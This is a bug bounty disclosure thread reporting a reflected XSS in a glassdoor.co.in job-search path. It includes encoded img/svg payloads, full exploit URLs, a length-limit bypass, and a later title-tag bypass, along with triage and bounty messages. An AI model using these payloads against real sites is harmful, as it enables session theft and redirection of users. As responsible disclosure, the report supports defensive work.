title: Reflected XSS at https://www.glassdoor.co.in/Job/pratt-whitney-jobs-SRCH_KE0,13.htm?initiatedFromCountryPicker=true&countryRedirect=true
vulnerability_information:
Summary:  There is a reflected XSS vulnerability in   https://www.glassdoor.co.in/Job/pratt-whitney-jobs-SRCH_KE0,13.htm?initiatedFromCountryPicker=true&countryRedirect=true

Vulnerability Type: Reflected XSS
Browsers tested: Chrome, Firefox
Payload: %22%3cimg%20src%3dx%20onerro%3d%3e%3csvg%20onload%3dalert%281%29%3e

Steps To Reproduce:
1. Navigate to  https://www.glassdoor.co.in/Job/pratt-whitney-jobs-SRCH_KE0,13.htm?initiatedFromCountryPicker=true&countryRedirect=true

2.   /Job/[INPUT]pratt-whitney-jobs-SRCH_KE0,13.htm?
     if we input any value in the path then it is reflected on the page.
     Enter this payload here: %22%3cimg%20src%3dx%20onerro%3d%3e%3csvg%20onload%3dalert%281%29%3e

3. But there is a character length limitation to the input.

4.   /Job/pratt-whitney-jobs-SRCH_KE0,[This value].htm? 
     We can bypass the character limitation by changing this value

5. Now change this value from 13 to 50

6.   Now open this url: https://www.glassdoor.co.in/Job/%22%3cimg%20src%3dx%20onerro%3d%3e%3csvg%20onload%3dalert%281%29%3epratt-whitney-jobs-SRCH_KE0,50.htm?initiatedFromCountryPicker=true&countryRedirect=true
     See the response in browser, an alert will pop up

## Impact

Using XSS an attacker can steals the victim cookie and can also redirect him to a malicious site controlled by the attacker.

activities.message:
Hello @picklen1ck,

Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.

Regards,
@0xcain

@0xcain - thanks for the triage and summary.
@picklen1ck - thanks for your report, I was able to verify it. Will bring it to the attention of our internal development team.

hello @jjone 
Is there any update about report status?
@picklen1ck - haven't heard back from the internal development team yet. Will keep you posted as soon as I hear back from them!

Hi @jjone 
any update regarding report status? 
Its been a month now since I reported.

@n1xk_10 - this has been resolved. Do let us know here if you find any issues with the fix. Also sorry for the delay in the bounty handout. Bounty reload would be happening 1st week of Oct - so I will handout the bounty as soon as it happens! Thanks for your patience!

@jjone - this endpoint is still vulnerable inside title tag.

Open this link to see the alert pop up:
https://www.glassdoor.co.in/Job/pratn1xk%22%3cimg%20src%3dx%20onerro%3d%3e%3c%252ftitle%3e%3csvg%20onload%3dalert%281%29%3et-whitney-jobsssssssssssssssssssssssssssssssssssssssssss-SRCH_KE0,60.htm?initiatedFromCountryPicker=true&countryRedirect=true

Actually the encoding is only done for the first apperance  of < > "
@n1xk_10 - thanks for checking that. I have brought this to the attention of our development team!. Will add a small bonus for reporting the bypass to us here.

hello @jjone
what's the status for bounty payout?
@n1xk_10 - sorry for the delay on the bounty payout. Our internal bounty should be reloaded today - so will hand it out as soon as it happens!
Bonus for the reporting the bypass out here!
@n1xk_10 - this should now have been resolved. Can you verify it for us?
